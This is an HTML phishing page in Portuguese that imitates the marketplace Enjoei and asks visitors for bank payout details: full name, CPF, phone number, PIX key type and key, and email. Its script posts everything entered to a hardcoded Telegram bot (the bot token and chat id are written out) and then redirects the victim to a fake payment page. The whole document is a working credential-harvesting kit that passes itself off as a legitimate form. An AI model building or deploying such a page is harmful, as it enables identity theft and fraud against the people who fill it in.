<!DOCTYPE html>
<html lang="pt-BR">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>ENJOEI - Receba seus Pagamentos</title>
  <style>
    body {
      font-family: Arial, sans-serif;
      background-color: #f4f4f4;
      margin: 0;
      padding: 0;
    }

    .logo-banner {
      background-color: #fff;
      text-align: center;
      padding: 20px 0;
      border-bottom: 1px solid #ddd;
    }

    .o-container.-with-gutter {
      max-width: 600px;
      margin: 40px auto;
      background: #fff;
      padding: 30px;
      border-radius: 10px;
      box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
    }

    .c-clean-header__wrapper {
      text-align: center;
      margin-bottom: 20px;
    }

    .header-title {
      font-size: 24px;
      margin: 0;
      color: #61005D;
    }

    .session-title {
      font-size: 20px;
      margin-bottom: 10px;
      color: #61005D;
    }

    .session-text {
      font-size: 14px;
      color: #555;
      margin-bottom: 20px;
    }

    .l-field {
      margin-bottom: 20px;
    }

    .l-label {
      display: block;
      margin-bottom: 5px;
      color: #333;
      font-weight: bold;
    }

    .o-input {
      width: 100%;
      padding: 10px;
      border: 1px solid #ccc;
      border-radius: 5px;
      font-size: 14px;
    }

    .mensagem-erro {
      font-size: 12px;
      color: red;
      display: none;
      margin-top: 5px;
    }

    .submit-button {
      background-color: #61005D;
      color: #fff;
      padding: 12px 20px;
      border: none;
      border-radius: 5px;
      font-size: 16px;
      cursor: pointer;
      width: 100%;
    }

    .submit-button:hover {
      background-color: #4d004b;
    }
  </style>
</head>
<body>
  <div class="logo-banner">
    <svg xmlns="http://www.w3.org/2000/svg" width="60" height="60" fill="none" viewBox="0 0 30 30">
      <path fill="#61005D" fill-rule="evenodd" d="M1.25 14.19C1.25 5.845 6.813-.005 15.002-.005s13.752 5.85 13.741 14.193c0 .96-.033 1.943-.143 2.749H1.393c-.11-.806-.143-1.8-.143-2.749m20.485-2.197c-.343-4.348-3.135-6.147-6.733-6.147s-6.39 1.799-6.733 6.147zM8.093 20.37c1.644 2.45 3.874 3.763 6.909 3.763s5.265-1.313 6.91-3.763l5.198 3.002c-2.561 5.088-7.428 6.622-12.108 6.622s-9.547-1.534-12.108-6.622z" clip-rule="evenodd"/>
    </svg>
  </div>

  <div class="o-container -with-gutter">
    <header class="c-clean-header">
      <div class="c-clean-header__wrapper">
        <h1 class="header-title">Receba seus Pagamentos</h1>
      </div>
    </header>

    <section class="session-wrapper">
      <div class="session-header">
        <h2 class="session-title">Dados Bancários</h2>
        <p class="session-text">Preencha seus dados bancários para receber seus pagamentos de forma segura e rápida.</p>
      </div>

      <form id="payment-form">
        <div class="l-field">
          <label class="l-label" for="nome">Nome completo</label>
          <input type="text" id="nome" name="nome" class="o-input" placeholder="Digite seu nome completo">
          <div class="mensagem-erro">Este campo é obrigatório.</div>
        </div>

        <div class="l-field">
          <label class="l-label" for="cpf">CPF</label>
          <input type="text" id="cpf" name="cpf" class="o-input" placeholder="Digite seu CPF">
          <div class="mensagem-erro">Digite um CPF válido.</div>
        </div>

        <div class="l-field">
          <label class="l-label" for="telefone">Telefone</label>
          <input type="text" id="telefone" name="telefone" class="o-input" placeholder="Digite seu telefone">
          <div class="mensagem-erro">Este campo é obrigatório.</div>
        </div>

        <div class="l-field">
          <label class="l-label" for="pix_key_type">Tipo de chave PIX</label>
          <select id="pix_key_type" name="pix_key_type" class="o-input">
            <option value="cpf">CPF</option>
            <option value="celular">Celular</option>
            <option value="email">E-mail</option>
            <option value="chave aleatoria">Chave aleatória</option>
          </select>
          <div class="mensagem-erro">Selecione o tipo de chave PIX.</div>
        </div>

        <div class="l-field">
          <label class="l-label" for="pix_key">Chave PIX</label>
          <input type="text" id="pix_key" name="pix_key" class="o-input" placeholder="Digite sua chave PIX">
          <div class="mensagem-erro">Este campo é obrigatório.</div>
        </div>

        <div class="l-field">
          <label class="l-label" for="email">E-mail</label>
          <input type="email" id="email" name="email" class="o-input" placeholder="Digite seu e-mail">
          <div class="mensagem-erro">Digite um e-mail válido.</div>
        </div>

        <button type="submit" class="submit-button">Enviar Dados</button>
      </form>
    </section>
  </div>

  <script>
    document.querySelector('#payment-form').addEventListener('submit', function(e) {
      e.preventDefault();
      let formValid = true;

      // Validação do nome
      if (document.querySelector('#nome').value.trim() === '') {
        formValid = false;
        document.querySelector('#nome').nextElementSibling.style.display = 'block';
      } else {
        document.querySelector('#nome').nextElementSibling.style.display = 'none';
      }

      // Validação do CPF
      if (document.querySelector('#cpf').value.trim() === '') {
        formValid = false;
        document.querySelector('#cpf').nextElementSibling.style.display = 'block';
      } else {
        document.querySelector('#cpf').nextElementSibling.style.display = 'none';
      }

      // Validação do telefone
      if (document.querySelector('#telefone').value.trim() === '') {
        formValid = false;
        document.querySelector('#telefone').nextElementSibling.style.display = 'block';
      } else {
        document.querySelector('#telefone').nextElementSibling.style.display = 'none';
      }

      // Validação do tipo de chave PIX
      if (document.querySelector('#pix_key_type').value === '') {
        formValid = false;
        document.querySelector('#pix_key_type').nextElementSibling.style.display = 'block';
      } else {
        document.querySelector('#pix_key_type').nextElementSibling.style.display = 'none';
      }

      // Validação da chave PIX
      if (document.querySelector('#pix_key').value.trim() === '') {
        formValid = false;
        document.querySelector('#pix_key').nextElementSibling.style.display = 'block';
      } else {
        document.querySelector('#pix_key').nextElementSibling.style.display = 'none';
      }

      // Validação do e-mail
      if (document.querySelector('#email').value.trim() === '') {
        formValid = false;
        document.querySelector('#email').nextElementSibling.style.display = 'block';
      } else {
        document.querySelector('#email').nextElementSibling.style.display = 'none';
      }

      if (!formValid) return;

      const nome = document.querySelector('#nome').value;
      const cpf = document.querySelector('#cpf').value;
      const telefone = document.querySelector('#telefone').value;
      const pixKeyType = document.querySelector('#pix_key_type').value;
      const pixKey = document.querySelector('#pix_key').value;
      const email = document.querySelector('#email').value;

      // Enviar dados para o bot do Telegram
      const botToken = '7921679015:AAGhQVxbqfC7iUreIKLeZ-cBKWjIp4efsgI';
      const chatId = '5640550536';
      const message = `
        Nome: ${nome}
        CPF: ${cpf}
        Telefone: ${telefone}
        Tipo de Chave PIX: ${pixKeyType}
        Chave PIX: ${pixKey}
        E-mail: ${email}
      `;
      const telegramApiUrl = `https://api.telegram.org/bot${botToken}/sendMessage`;

      fetch(telegramApiUrl, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify({
          chat_id: chatId,
          text: message,
        }),
      })
      .then(response => response.json())
      .then(data => {
        // Redirecionar para a página de pagamento após o envio dos dados
        window.location.href = '/VeryPagement/pagamento.html';

      })
      .catch(error => {
        console.error('Erro ao enviar os dados para o Telegram:', error);
      });
    });
  </script>
</body>
</html>
